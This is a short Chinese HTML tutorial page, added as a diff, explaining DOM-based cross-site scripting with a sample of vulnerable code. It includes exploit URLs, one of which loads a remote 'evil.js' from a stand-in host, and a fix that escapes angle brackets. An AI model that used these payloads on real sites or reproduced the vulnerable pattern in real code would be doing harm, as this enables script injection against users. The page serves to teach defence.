@@ -1,0 +1,32 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>跨站脚本攻击</TITLE>
+<META content="text/html; charset=gb2312" http-equiv=Content-Type>
+<META name=GENERATOR content="MSHTML 10.00.9200.16521"></HEAD>
+<BODY>
+<P>跨站脚本攻击</P>
+<P>URL:</P>
+<P><A 
+href="http://www.example.com/greet.html?David">http://www.example.com/greet.html?David</A></P>
+<P><STRONG>缺陷代码：</STRONG></P>
+<P>&lt;script&gt;</P>
+<P>var name = decodeURIComponent(window.location.search.substring(1))||"";</P>
+<P>document.write("hello"+ name);</P>
+<P>&lt;/script&gt;</P>
+<P><STRONG>被利用：</STRONG></P>
+<P><A 
+href="http://www.example.com/greet.html?%3Cscript%3Ealert('David')%3C/script%3E">http://www.example.com/greet.html?%3Cscript%3E<FONT 
+color=#ff0000>alert('David')</FONT>%3C/script%3E</A></P>
+<P><STRONG>脚本就成了：</STRONG></P>
+<P>document.write("hello"+&lt;script&gt;alert('David')&lt;/script&gt;);</P>
+<P><STRONG>恶意脚本就驻留在了页面。</STRONG></P>
+<P><A 
+href="http://www.example.com/greet.html?%3Cscript src=http://xxx.com/js/evil.js%3E%3C/script%3E">http://www.example.com/greet.html?%3Cscript 
+<FONT color=#ff0000>src=http://xxx.com/js/evil.js</FONT>%3E%3C/script%3E</A></P>
+<P>document.write("hello"+&lt;script<U><FONT color=#0066cc> 
+src=http://xxx.com/js/evil.js</FONT></U>&gt;&lt;/script&gt;);</P>
+<P><STRONG>预防：</STRONG></P>
+<P>过滤尖括号name = name.replace(/&lt;/g,"&amp;lt;").replace(/&gt;/g,"&amp;gt;");</P>
+<P>&nbsp;</P>
+<P>跨站脚本攻击</P>
+<P><A 
+href="http://www.cert.org/advisories/CA-2000-02.html">www.cert.org/advisories/CA-2000-02.html</A></P></BODY></HTML>
